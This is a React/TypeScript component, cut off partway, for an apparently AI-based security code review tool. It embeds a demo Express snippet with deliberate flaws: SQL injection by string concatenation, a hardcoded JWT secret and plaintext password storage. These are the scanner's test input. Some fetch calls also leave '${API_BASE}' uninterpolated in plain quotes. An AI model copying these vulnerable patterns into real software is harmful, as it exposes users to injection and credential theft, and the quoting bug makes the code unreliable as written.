import { useState, useRef, useEffect, useCallback } from "react";
import { Zap, Upload, ChevronDown, AlertTriangle, Wind, CheckCircle, Sparkles, X, Shield, ArrowRight, RotateCcw, FileCode, Github, Folder, FileText, Keyboard, Award } from "lucide-react";
import Editor, { DiffEditor, useMonaco } from "@monaco-editor/react";
import { API_BASE } from "../lib/api";

// ── Animated counter hook ─────────────────────────────────────────────────────
function useCountUp(target: number, duration = 800) {
  const [display, setDisplay] = useState(0);
  useEffect(() => {
    if (target === 0) { setDisplay(0); return; }
    let start = 0;
    const step = Math.ceil(target / (duration / 16));
    const timer = setInterval(() => {
      start += step;
      if (start >= target) { setDisplay(target); clearInterval(timer); }
      else setDisplay(start);
    }, 16);
    return () => clearInterval(timer);
  }, [target, duration]);
  return display;
}

const SAMPLE_CODE = `// 🛡️ Demo Code — This is a sample with intentional vulnerabilities.
// You can paste your own code, upload a file, or import from GitHub.
// Click "Run AI Review" to analyze any code for security issues.

const express = require('express');
const app = express();
const db = require('./database');

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
  const user = await db.query(query);
  if (user.length > 0) {
    const token = jwt.sign({ id: user[0].id }, 'secret123');
    res.json({ token: token });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/user/:id', async (req, res) => {
  const userId = req.params.id;
  const userData = await db.query(\`SELECT * FROM users WHERE id = \${userId}\`);
  res.json(userData);
});

app.post('/register', async (req, res) => {
  const { username, email, password } = req.body;
  await db.query(\`INSERT INTO users VALUES ('\${username}', '\${email}', '\${password}')\`);
  console.log('User registered: ' + email);
  res.json({ success: true });
});`;

const LANGUAGES = ["JavaScript", "TypeScript", "Python", "Go", "Java", "Rust", "PHP", "Ruby", "C#", "C++", "Swift", "Kotlin"];

const SEV_COLORS: Record<string, { color: string; bg: string; border: string }> = {
  critical: { color: "#ef4444", bg: "rgba(239,68,68,0.12)", border: "rgba(239,68,68,0.4)" },
  high:     { color: "#f97316", bg: "rgba(249,115,22,0.1)",  border: "rgba(249,115,22,0.35)" },
  medium:   { color: "#f59e0b", bg: "rgba(245,158,11,0.08)", border: "rgba(245,158,11,0.3)" },
  low:      { color: "#22c55e", bg: "rgba(34,197,94,0.08)",  border: "rgba(34,197,94,0.25)" },
};

function getSevStyle(sev: string) {
  return SEV_COLORS[sev?.toLowerCase()] || SEV_COLORS.low;
}

// Safely convert any value to a displayable string
function safeStr(val: any): string {
  if (val === null || val === undefined) return "";
  if (typeof val === "string") {
    // Unescape literal \n \t that AI sometimes puts in JSON strings
    return val
      .replace(/\\n/g, "\n")
      .replace(/\\t/g, "\t")
      .replace(/\\r/g, "");
  }
  if (typeof val === "object") return JSON.stringify(val, null, 2);
  return String(val);
}

export function CodeReview() {
  const [code, setCode] = useState(SAMPLE_CODE);
  const [selectedLang, setSelectedLang] = useState("JavaScript");
  const [showLangDropdown, setShowLangDropdown] = useState(false);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [analyzed, setAnalyzed] = useState(false);
  const [issues, setIssues] = useState<any[]>([]);
  const [selectedIssue, setSelectedIssue] = useState<any>(null);
  const [activeTab, setActiveTab] = useState<"all" | "security" | "smell" | "bug" | "performance">("all");
  const [showComparison, setShowComparison] = useState(false);
  const [showExploit, setShowExploit] = useState(false);
  const [appliedFixes, setAppliedFixes] = useState<Set<string>>(new Set());
  const [scanResult, setScanResult] = useState<any>(null);
  const [fixDetail, setFixDetail] = useState<any>(null);
  const [loadingFix, setLoadingFix] = useState(false);
  const [originalCode, setOriginalCode] = useState(SAMPLE_CODE);
  const [errorMsg, setErrorMsg] = useState("");
  const [repoName, setRepoName] = useState("my-project");
  const [isFixingAll, setIsFixingAll] = useState(false);
  const [fixAllSummary, setFixAllSummary] = useState<any[]>([]);
  const [expandedIssue, setExpandedIssue] = useState<string | null>(null);
  const [isDiffMode, setIsDiffMode] = useState(false);
  const [baseCode, setBaseCode] = useState(SAMPLE_CODE);
  const [autoFixSetting, setAutoFixSetting] = useState(false);
  const [prCommentPosted, setPrCommentPosted] = useState(false);
  const [showShortcuts, setShowShortcuts] = useState(false);

  // Animated quality score
  const animatedScore = useCountUp(analyzed && scanResult ? scanResult.qualityScore : 0);

  // Ask AI chat state — per issue
  const [askAiIssueId, setAskAiIssueId] = useState<string | null>(null);
  const [askAiInput, setAskAiInput] = useState("");
  const [askAiMessages, setAskAiMessages] = useState<Record<string, { role: "user" | "ai"; text: string }[]>>({});
  const [askAiLoading, setAskAiLoading] = useState(false);
  
  const textareaRef = useRef<HTMLTextAreaElement>(null);
  const lineNumRef = useRef<HTMLDivElement>(null);
  const dropdownRef = useRef<HTMLDivElement>(null);
  const monaco = useMonaco();

  const getMonacoLang = (lang: string) => {
    const v = lang.toLowerCase();
    if(v === 'c++') return 'cpp';
    if(v === 'c#') return 'csharp';
    return v;
  };

  useEffect(() => {
    if (monaco) {
      monaco.editor.defineTheme('codeguardian-dark', {
        base: 'vs-dark',
        inherit: true,
        rules: [],
        colors: {
          'editor.background': '#07071a',
          'editorLineNumber.foreground': '#2d3748',
          'editorLineNumber.activeForeground': '#c9d1d9',
        }
      });
      monaco.editor.setTheme('codeguardian-dark');
    }
  }, [monaco]);

  const [showGithubModal, setShowGithubModal] = useState(false);
  const [githubRepoUrl, setGithubRepoUrl] = useState("");
  const [githubFiles, setGithubFiles] = useState<any[]>([]);
  const [githubCurrentPath, setGithubCurrentPath] = useState("");
  const [githubLoading, setGithubLoading] = useState(false);
  const [githubError, setGithubError] = useState("");

  const fetchRepoContents = async (repoStr: string, path: string = "") => {
    setGithubLoading(true);
    setGithubError("");
    try {
      let cleanRepo = repoStr.replace("https://github.com/", "").replace(/\/$/, "").trim();
      const repoParts = cleanRepo.split("/").filter(Boolean);

      if (repoParts.length === 1) {
        // Just a username — list their repos
        const username = repoParts[0];
        const res = await fetch(
          `https://api.github.com/users/${username}/repos?per_page=100&sort=updated`,
          { headers: { "Accept": "application/vnd.github+json", "User-Agent": "CodeGuardian-App" } }
        );
        if (res.status === 404) throw new Error(`GitHub user "${username}" not found.`);
        if (res.status === 403) throw new Error("GitHub API rate limit exceeded. Try again in a minute.");
        if (!res.ok) throw new Error(`GitHub error: ${res.status}`);
        const data = await res.json();
        if (!Array.isArray(data) || data.length === 0) throw new Error("No public repositories found for this user.");
        setGithubFiles(data.map((r: any) => ({ name: r.name, path: r.name, type: "repo", full_name: r.full_name })));
        setGithubRepoUrl(username);
        setGithubCurrentPath("");
      } else if (repoParts.length >= 2) {
        cleanRepo = repoParts.slice(0, 2).join("/");
        const apiPath = path ? `/${path}` : "";
        const res = await fetch(
          `https://api.github.com/repos/${cleanRepo}/contents${apiPath}`,
          { headers: { "Accept": "application/vnd.github+json", "User-Agent": "CodeGuardian-App" } }
        );
        if (res.status === 404) throw new Error(`Repository "${cleanRepo}" not found or is private.`);
        if (res.status === 403) throw new Error("GitHub API rate limit exceeded. Try again in a minute.");
        if (!res.ok) throw new Error(`GitHub error: ${res.status}`);
        const data = await res.json();
        if (Array.isArray(data)) {
          setGithubFiles(data.sort((a: any, b: any) => (a.type === "dir" ? -1 : 1)));
          setGithubRepoUrl(cleanRepo);
          setGithubCurrentPath(path);
        } else if (data.type === "file") {
          handleGithubFileSelect(data);
        }
      } else {
        throw new Error("Enter a GitHub username or repo URL (e.g. facebook/react)");
      }
    } catch (e: any) {
      setGithubError(e.message);
    } finally {
      setGithubLoading(false);
    }
  };

  const handleGithubFileSelect = async (file: any) => {
    if (file.type === "dir") {
      fetchRepoContents(githubRepoUrl, file.path);
    } else if (file.type === "repo") {
      setGithubRepoUrl(file.full_name);
      fetchRepoContents(file.full_name, "");
    } else if (file.type === "file") {
      setGithubLoading(true);
      try {
        const res = await fetch(file.download_url);
        if (!res.ok) throw new Error("Failed to fetch file.");
        const text = await res.text();
        setCode(text);
        setAnalyzed(false);
        setIssues([]);
        setScanResult(null);
        setErrorMsg("");
        setSelectedIssue(null);
        setAppliedFixes(new Set());
        setFixDetail(null);
        setShowGithubModal(false);
        setRepoName(githubRepoUrl + "/" + file.path);
        const extMatch = file.name.match(/\.([a-z0-9]+)$/i);
        if (extMatch) {
          const ext = extMatch[1].toLowerCase();
          if(['js','jsx'].includes(ext)) setSelectedLang('JavaScript');
          if(['ts','tsx'].includes(ext)) setSelectedLang('TypeScript');
          if(['py'].includes(ext)) setSelectedLang('Python');
          if(['go'].includes(ext)) setSelectedLang('Go');
          if(['java'].includes(ext)) setSelectedLang('Java');
          if(['rs'].includes(ext)) setSelectedLang('Rust');
        }
      } catch(e: any) {
        setGithubError(e.message);
      } finally {
        setGithubLoading(false);
      }
    }
  };

  useEffect(() => {
    const token = localStorage.getItem("codeguardian_token") || "";
    if (token) {
      fetch('${API_BASE}/api/settings', {
        headers: { 'Authorization': `Bearer ${token}` }
      })
        .then(res => res.json())
        .then(data => {
          if (data.autoFix !== undefined) setAutoFixSetting(data.autoFix);
        })
        .catch(() => {});
    }
  }, []);

  // Close dropdown on outside click
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setShowLangDropdown(false);
      }
    };
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, []);

  // ── Keyboard shortcuts ────────────────────────────────────────────────────
  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      // Ctrl+Enter → Run analysis
      if (e.ctrlKey && e.key === "Enter") {
        e.preventDefault();
        if (!isAnalyzing) handleRunAnalysis();
      }
      // Ctrl+Shift+F → Fix all
      if (e.ctrlKey && e.shiftKey && e.key === "F") {
        e.preventDefault();
        if (analyzed && issues.length > 0 && !isFixingAll) handleFixAll();
      }
      // Escape → close modals
      if (e.key === "Escape") {
        setShowComparison(false);
        setShowExploit(false);
        setShowGithubModal(false);
        setShowShortcuts(false);
      }
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [isAnalyzing, analyzed, issues, isFixingAll]);

  // Validate that refactoredCode looks like real code, not a JSON object
  const isValidCodeFix = (fixedCode: string, origCode: string): boolean => {
    if (!fixedCode || fixedCode.trim().length < 5) return false;
    const trimmed = fixedCode.trim();
    // Reject only if it's a single-line JSON object with no newlines (clearly not code)
    if (trimmed.startsWith("{") && trimmed.includes('":"') && !trimmed.includes("\n") && trimmed.endsWith("}")) return false;
    return true;
  };

  const handleSelectIssue = (issue: any) => {
    setSelectedIssue(issue);
    setFixDetail(null);
    // Auto-load fix details when issue is selected
    handleGetFix(issue);
  };

  const lines = code.split("\n");

  // Highlight lines that have issues
  const issueLineMap: Record<number, any> = {};
  issues.forEach((issue) => {
    if (!issue.line) return;
    const parts = String(issue.line).split("-").map(Number);
    const start = parts[0], end = parts[1] || parts[0];
    for (let i = start; i <= end; i++) issueLineMap[i] = issue;
  });

  const handleRunAnalysis = async () => {
    if (!code.trim()) return;
    setIsAnalyzing(true);
    setAnalyzed(false);
    setIssues([]);
    setSelectedIssue(null);
    setErrorMsg("");
    setScanResult(null);
    setOriginalCode(code); // save original before any fixes
    setBaseCode(code);
    setIsDiffMode(false);
    setPrCommentPosted(false);
    try {
      const token = localStorage.getItem("codeguardian_token") || "";
      const resp = await fetch("${API_BASE}/api/review/analyze", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify({ code, language: selectedLang, repo: repoName, branch: "main" }),
      });
      const data = await resp.json();
      if (!resp.ok) { setErrorMsg(data.error || "Analysis failed"); }
      else {
        // Sanitize every field that could be an object from the AI
        const sanitizedIssues = (data.issues || []).map((issue: any) => ({
          ...issue,
          id: safeStr(issue.id) || String(Math.random()),
          title: safeStr(issue.title),
          description: safeStr(issue.description),
          fix: safeStr(issue.fix),
          refactoredCode: safeStr(issue.refactoredCode),
          type: safeStr(issue.type),
          severity: safeStr(issue.severity),
          line: safeStr(issue.line),
        }));
        const sanitizedResult = {
          ...data,
          summary: safeStr(data.summary),
          issues: sanitizedIssues,
        };
        setScanResult(sanitizedResult);
        setPrCommentPosted(!!data.prCommentPosted);
        setIssues(sanitizedIssues);
        setSelectedIssue(sanitizedIssues[0] || null);
        if (sanitizedIssues[0]) handleGetFix(sanitizedIssues[0]);
        setAnalyzed(true);

        if (autoFixSetting && sanitizedIssues.length > 0) {
          setTimeout(() => handleFixAll(sanitizedIssues), 500);
        }
      }
    } catch {
      setErrorMsg("Cannot connect to backend. Make sure server is running on port 5000.");
    }
    setIsAnalyzing(false);
  };

  const handleGetFix = async (issue: any) => {
    setLoadingFix(true);
    setFixDetail(null);
    // Use originalCode if set, otherwise fall back to current code
    const codeToFix = originalCode && originalCode.trim().length > 0 ? originalCode : code;
    try {
      const token = localStorage.getItem("codeguardian_token") || "";
      const resp = await fetch("${API_BASE}/api/review/fix", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify({ code: codeToFix, issue, language: selectedLang }),
      });
      const data = await resp.json();
      const sanitized = { ...data };
      ["explanation","attackVector","impact","prevention","refactoredCode","beforeCode","afterCode"].forEach(k => {
        if (sanitized[k] !== undefined) sanitized[k] = safeStr(sanitized[k]);
      });
      setFixDetail(sanitized);
      setLoadingFix(false);
      return sanitized;
    } catch {
      setFixDetail(null);
      setLoadingFix(false);
      return null;
    }
  };

  const handleFixAll = async (issuesList?: any[]) => {
    const targetIssues = issuesList || issues;
    if (!targetIssues.length) return;
    setIsFixingAll(true);
    setFixAllSummary([]);
    try {
      const token = localStorage.getItem("codeguardian_token") || "";
      const resp = await fetch("${API_BASE}/api/review/fix-all", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify({ code: originalCode, issues: targetIssues, language: selectedLang }),
      });
      const data = await resp.json();
      const fixed = safeStr(data.fixedCode || "");
      if (fixed && isValidCodeFix(fixed, originalCode)) {
        setCode(fixed);
        setOriginalCode(fixed); // update original so subsequent fixes build on top
        setAppliedFixes(new Set(issues.map((i: any) => i.id)));
        setFixAllSummary(data.fixSummary || []);
      } else {
        // If validation fails, still show the code — don't silently discard
        if (fixed && fixed.trim().length > 0) {
          setCode(fixed);
          setOriginalCode(fixed);
          setAppliedFixes(new Set(issues.map((i: any) => i.id)));
          setFixAllSummary(data.fixSummary || []);
          setIsDiffMode(true);
        }
      }
    } catch (err) {
      console.error("Fix all failed:", err);
    }
    setIsFixingAll(false);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setRepoName(file.name.replace(/\.[^.]+$/, ""));
    const reader = new FileReader();
    reader.onload = (ev) => setCode(ev.target?.result as string || "");
    reader.readAsText(file);
    e.target.value = "";
  };

  const handleAskAi = async (issue: any, question: string) => {
    if (!question.trim() || askAiLoading) return;
    const issueId = issue.id || issue.title;
    const userMsg = { role: "user" as const, text: question };
    setAskAiMessages(prev => ({ ...prev, [issueId]: [...(prev[issueId] || []), userMsg] }));
    setAskAiInput("");
    setAskAiLoading(true);
    try {
      const token = localStorage.getItem("codeguardian_token") || "";
      const resp = await fetch("${API_BASE}/api/review/fix", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify({
          code,
          language: selectedLang,
          issue: {
            ...issue,
            description: `User question: "${question}"\n\nOriginal issue: ${issue.description}`,
          },
        }),
      });
      const data = await resp.json();
      const answer = safeStr(data.explanation || data.prevention || data.attackVector || "I couldn't generate a response. Please try again.");
      setAskAiMessages(prev => ({
        ...prev,
        [issueId]: [...(prev[issueId] || []), { role: "ai", text: answer }],
      }));
    } catch {
      setAskAiMessages(prev => ({
        ...prev,
        [issueId]: [...(prev[issueId] || []), { role: "ai", text: "Failed to connect. Make sure the backend is running." }],
      }));
    }
    setAskAiLoading(false);
  };

  const downloadSecurityBadge = () => {
    if (!scanResult) return;
    const score = scanResult.qualityScore;
    const passed = score >= 70;
    const color = score >= 80 ? "#22c55e" : score >= 60 ? "#f59e0b" : "#ef4444";
    const label = score >= 80 ? "SECURED" : score >= 60 ? "REVIEWED" : "NEEDS WORK";
    const date = new Date().toLocaleDateString("en-US", { month: "short", year: "numeric" });

    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="280" height="80">
  <defs>
    <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#0d0d23"/>
      <stop offset="100%" style="stop-color:#07071a"/>
    </linearGradient>
    <linearGradient id="accent" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" style="stop-color:#6366f1"/>
      <stop offset="100%" style="stop-color:#22d3ee"/>
    </linearGradient>
  </defs>
  <rect width="280" height="80" rx="12" fill="url(#bg)" stroke="rgba(255,255,255,0.1)" stroke-width="1"/>
  <rect x="0" y="0" width="4" height="80" rx="2" fill="url(#accent)"/>
  <text x="20" y="22" font-family="Inter,sans-serif" font-size="10" font-weight="700" fill="#6b7280" letter-spacing="1.5">CODEGUARDIAN AI</text>
  <text x="20" y="46" font-family="Inter,sans-serif" font-size="22" font-weight="800" fill="${color}">${score}/100</text>
  <text x="20" y="64" font-family="Inter,sans-serif" font-size="11" font-weight="600" fill="${color}">${label}</text>
  <text x="260" y="64" font-family="Inter,sans-serif" font-size="10" fill="#4b5563" text-anchor="end">${date}</text>
  <text x="260" y="46" font-family="Inter,sans-serif" font-size="10" fill="#374151" text-anchor="end">${repoName}</text>
  ${passed ? `<circle cx="248" cy="20" r="12" fill="rgba(34,197,94,0.15)" stroke="${color}" stroke-width="1.5"/>
  <text x="248" y="25" font-family="Inter,sans-serif" font-size="14" text-anchor="middle" fill="${color}">✓</text>` : ""}
</svg>`;

    const blob = new Blob([svg], { type: "image/svg+xml" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `codeguardian-badge-${repoName}-${score}.svg`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const filteredIssues = issues.filter((i) => {
    if (activeTab === "all") return true;
    if (activeTab === "smell") return i.type === "smell" || i.type === "code_smell";
    return i.type === activeTab;
  });

  const criticalCount = issues.filter(i => i.severity === "critical").length;
  const highCount = issues.filter(i => i.severity === "high").length;
  const mediumCount = issues.filter(i => i.severity === "medium").length;
  const lowCount = issues.filter(i => i.severity === "low").length;

  return (
    <div className="flex flex-col lg:flex-row h-full" style={{ fontFamily: "'Inter', sans-serif" }}>

      {/* ── LEFT: Editor Panel ── */}
      <div className="flex-1 flex flex-col min-w-0">

        {/* Toolbar */}
        <div className="relative flex items-center gap-2 px-4 py-3 border-b flex-wrap gap-y-2 flex-shrink-0"
          style={{ background: "rgba(13,13,35,0.95)", borderColor: "rgba(255,255,255,0.07)" }}>

          {/* Repo name */}
          <input
            value={repoName}
            onChange={e => setRepoName(e.target.value)}
            className="px-2 py-1 rounded-lg text-xs outline-none"
            style={{ background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#9ca3af", width: "110px" }}
          />

          {/* Language dropdown */}
          <div className="relative" ref={dropdownRef}>
            <button
              onClick={() => setShowLangDropdown(v => !v)}
              className="flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm transition-all hover:bg-white/10"
              style={{ background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#e5e7eb" }}
            >
              <FileCode size={13} style={{ color: "#22d3ee" }} />
              {selectedLang}
              <ChevronDown size={12} />
            </button>
            {showLangDropdown && (
              <div className="absolute top-full left-0 mt-1 z-50 rounded-xl py-1 overflow-y-auto"
                style={{ background: "#0d0d23", border: "1px solid rgba(255,255,255,0.12)", boxShadow: "0 20px 40px rgba(0,0,0,0.6)", minWidth: "150px", maxHeight: "260px" }}>
                {LANGUAGES.map(lang => (
                  <button key={lang} onClick={() => { setSelectedLang(lang); setShowLangDropdown(false); setCode(""); setAnalyzed(false); setIssues([]); setScanResult(null); setErrorMsg(""); setSelectedIssue(null); setAppliedFixes(new Set()); }}
                    className="w-full text-left px-4 py-2 text-sm transition-colors hover:bg-white/10"
                    style={{ color: lang === selectedLang ? "#22d3ee" : "#9ca3af", fontWeight: lang === selectedLang ? 600 : 400 }}>
                    {lang}
                  </button>
                ))}
              </div>
            )}
          </div>

          {/* GitHub import */}
          <button onClick={() => { setShowGithubModal(true); setGithubFiles([]); setGithubCurrentPath(""); setGithubRepoUrl(""); setGithubError(""); setIsDiffMode(false); }}
            className="flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm transition-all hover:bg-white/10"
            style={{ background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#c084fc" }}>
            <Github size={13} />
            Import from GitHub
          </button>

          {/* Upload file */}
          <label className="flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm cursor-pointer transition-all hover:bg-white/10"
            style={{ background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#9ca3af" }}>
            <Upload size={13} />
            Upload File
            <input type="file" className="hidden" accept=".js,.ts,.py,.go,.java,.rs,.php,.rb,.cs,.cpp,.swift,.kt,.txt" onChange={handleFileUpload} />
          </label>

          {/* Reset */}
          <button onClick={() => { setCode(SAMPLE_CODE); setBaseCode(SAMPLE_CODE); setAnalyzed(false); setIssues([]); setScanResult(null); setErrorMsg(""); setSelectedIssue(null); setSelectedLang("JavaScript"); setRepoName("my-project"); setAppliedFixes(new Set()); setFixDetail(null); setIsDiffMode(false); }}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm transition-all hover:bg-white/10"
            style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)", color: "#6b7280" }}>
            <RotateCcw size={12} /> Reset
          </button>

          {/* View Diff Toggle */}
          {code !== baseCode && appliedFixes.size > 0 && (
            <button onClick={() => setIsDiffMode(!isDiffMode)}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm transition-all hover:bg-white/10"
              style={{ background: isDiffMode ? "rgba(99,102,241,0.2)" : "rgba(255,255,255,0.04)", border: isDiffMode ? "1px solid rgba(99,102,241,0.4)" : "1px solid rgba(255,255,255,0.08)", color: isDiffMode ? "#a5b4fc" : "#6b7280" }}>
              <FileCode size={12} /> {isDiffMode ? "Hide Diff" : "Show Changes"}
            </button>
          )}

          {/* Run button */}
          <button onClick={handleRunAnalysis} disabled={isAnalyzing}
            className="flex items-center gap-2 px-5 py-1.5 rounded-lg text-sm text-white transition-all hover:opacity-90 ml-auto"
            style={{ background: isAnalyzing ? "rgba(99,102,241,0.5)" : "linear-gradient(135deg, #6366f1, #22d3ee)", fontWeight: 600, boxShadow: "0 0 20px rgba(99,102,241,0.3)" }}
            title="Run AI Review (Ctrl+Enter)">
            {isAnalyzing
              ? <><div className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" />Analyzing…</>
              : <><Zap size={13} />Run AI Review</>}
          </button>

          {/* Keyboard shortcuts hint */}
          <button
            onClick={() => setShowShortcuts(v => !v)}
            className="flex items-center gap-1 px-2 py-1.5 rounded-lg text-xs transition-all hover:bg-white/10"
            style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.07)", color: "#4b5563" }}
            title="Keyboard shortcuts">
            <Keyboard size={12} />
          </button>
        </div>

        {/* Shortcuts tooltip */}
        {showShortcuts && (
          <div className="absolute top-14 right-4 z-50 rounded-xl p-3 space-y-1.5 shadow-2xl"
            style={{ background: "#0d0d23", border: "1px solid rgba(255,255,255,0.12)", minWidth: "220px" }}>
            <div style={{ fontSize: "10px", fontWeight: 700, color: "#6b7280", textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: "6px" }}>
              Keyboard Shortcuts
            </div>
            {[
              { keys: "Ctrl + Enter", action: "Run AI Review" },
              { keys: "Ctrl + Shift + F", action: "Fix All Issues" },
              { keys: "Escape", action: "Close modals" },
            ].map(({ keys, action }) => (
              <div key={keys} className="flex items-center justify-between gap-4">
                <span style={{ fontSize: "11px", color: "#9ca3af" }}>{action}</span>
                <kbd style={{ fontSize: "10px", color: "#a5b4fc", background: "rgba(99,102,241,0.15)", border: "1px solid rgba(99,102,241,0.25)", borderRadius: "4px", padding: "1px 6px", fontFamily: "'JetBrains Mono', monospace", whiteSpace: "nowrap" }}>
                  {keys}
                </kbd>
              </div>
            ))}
          </div>
        )}
        <div className="flex-1 overflow-hidden relative">
          {isDiffMode ? (
            <DiffEditor
              height="100%"
              language={getMonacoLang(selectedLang)}
              theme="codeguardian-dark"
              original={baseCode}
              modified={code}
              options={{
                minimap: { enabled: false },
                fontSize: 13,
                fontFamily: "'JetBrains Mono', monospace",
                padding: { top: 16 },
                scrollBeyondLastLine: false,
                renderSideBySide: false,
                readOnly: true,
              }}
            />
          ) : (
            <Editor
              height="100%"
              language={getMonacoLang(selectedLang)}
              theme="codeguardian-dark"
              value={code}
              onChange={(val) => setCode(val || "")}
              options={{
                minimap: { enabled: false },
                fontSize: 13,
                fontFamily: "'JetBrains Mono', monospace",
                padding: { top: 16 },
                scrollBeyondLastLine: false,
                smoothScrolling: true,
                cursorBlinking: "smooth",
                cursorSmoothCaretAnimation: "on",
                formatOnPaste: true,
                renderLineHighlight: "all",
              }}
            />
          )}
        </div>

        {/* Score bar */}
        <div className="flex items-center gap-4 px-4 py-2.5 border-t flex-shrink-0 flex-wrap gap-y-1"
          style={{ background: "rgba(13,13,35,0.95)", borderColor: "rgba(255,255,255,0.07)" }}>
          {errorMsg
            ? <span style={{ fontSize: "12px", color: "#f87171" }}>⚠ {errorMsg}</span>
            : analyzed && scanResult ? (
              <>
                <span style={{ fontSize: "12px", color: "#6b7280" }}>Quality Score</span>
                <span style={{ fontSize: "14px", fontWeight: 700, color: scanResult.qualityScore >= 70 ? "#22c55e" : scanResult.qualityScore >= 50 ? "#f59e0b" : "#ef4444" }}>
                  {animatedScore}/100
                </span>
                <span style={{ fontSize: "12px", color: "#6b7280" }}>·</span>
                <span style={{ fontSize: "12px", color: "#9ca3af" }}>{issues.length} issues</span>
                {criticalCount > 0 && <span style={{ fontSize: "12px", color: "#ef4444" }}>· {criticalCount} Critical</span>}
                {highCount > 0 && <span style={{ fontSize: "12px", color: "#f97316" }}>· {highCount} High</span>}
                {mediumCount > 0 && <span style={{ fontSize: "12px", color: "#f59e0b" }}>· {mediumCount} Medium</span>}
                {lowCount > 0 && <span style={{ fontSize: "12px", color: "#22c55e" }}>· {lowCount} Low</span>}
                {prCommentPosted && (
                  <span className="flex items-center gap-1.5 px-2 py-0.5 rounded-lg text-[10px] font-bold animate-pulse"
                    style={{ background: "rgba(34,211,238,0.15)", color: "#22d3ee", border: "1px solid rgba(34,211,238,0.3)" }}>
                    <Github size={10} /> PR BOT COMMENT POSTED
                  </span>
                )}
                <span style={{ fontSize: "12px", color: "#4b5563", marginLeft: "auto" }}>{safeStr(scanResult.summary)}</span>
                {/* Security Badge download */}
                <button
                  onClick={downloadSecurityBadge}
                  className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs transition-all hover:opacity-90 flex-shrink-0"
                  style={{
                    background: scanResult.qualityScore >= 70 ? "rgba(34,197,94,0.12)" : "rgba(245,158,11,0.1)",
                    border: `1px solid ${scanResult.qualityScore >= 70 ? "rgba(34,197,94,0.3)" : "rgba(245,158,11,0.3)"}`,
                    color: scanResult.qualityScore >= 70 ? "#22c55e" : "#f59e0b",
                    fontWeight: 600,
                  }}
                  title="Download security badge for your README">
                  <Award size={11} />
                  Badge
                </button>
              </>
            ) : (
              <span style={{ fontSize: "12px", color: "#4b5563" }}>Paste or upload code, then click Run AI Review</span>
            )}
        </div>
      </div>

      {/* ── RIGHT: AI Analysis Panel ── */}
      <div className="w-full lg:w-96 flex flex-col border-l"
        style={{ background: "rgba(10,10,25,0.95)", borderColor: "rgba(255,255,255,0.07)", height: "100%", overflow: "hidden" }}>

        {/* Sticky header — tabs only */}
        <div className="px-4 py-3 border-b flex-shrink-0" style={{ borderColor: "rgba(255,255,255,0.07)" }}>
          <div className="flex items-center gap-2 mb-3">
            <Sparkles size={15} style={{ color: "#22d3ee" }} />
            <span style={{ fontWeight: 700, fontSize: "14px", color: "#f9fafb" }}>AI Analysis</span>
            {analyzed && issues.length > 0 && (
              <span className="ml-auto text-xs px-2 py-0.5 rounded-full"
                style={{ background: "rgba(239,68,68,0.2)", color: "#f87171" }}>
                {issues.length} issues
              </span>
            )}
          </div>
          <div className="flex gap-1 flex-wrap">
            {(["all", "security", "bug", "performance", "smell"] as const).map(tab => (
              <button key={tab} onClick={() => setActiveTab(tab)}
                className="px-2.5 py-1 rounded-lg text-xs capitalize transition-all"
                style={{
                  background: activeTab === tab ? "rgba(99,102,241,0.2)" : "transparent",
                  color: activeTab === tab ? "#a5b4fc" : "#6b7280",
                  border: activeTab === tab ? "1px solid rgba(99,102,241,0.3)" : "1px solid transparent",
                  fontWeight: activeTab === tab ? 600 : 400,
                }}>
                {tab}
              </button>
            ))}
          </div>
        </div>

        {/* ONE single scroll — Fix All + issues + selected detail all together */}
        <div className="flex-1 overflow-y-auto p-3 space-y-2">

          {/* Fix All button — inside scroll */}
          {analyzed && issues.length > 0 && (
            <>
              <button
                onClick={() => handleFixAll()}
                disabled={isFixingAll || appliedFixes.size === issues.length}
                className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl text-sm font-semibold transition-all hover:opacity-90"
                title="Fix All Issues (Ctrl+Shift+F)"
                style={{
                  background: appliedFixes.size === issues.length ? "rgba(34,197,94,0.15)" : "linear-gradient(135deg, #ef4444, #f97316)",
                  color: appliedFixes.size === issues.length ? "#22c55e" : "white",
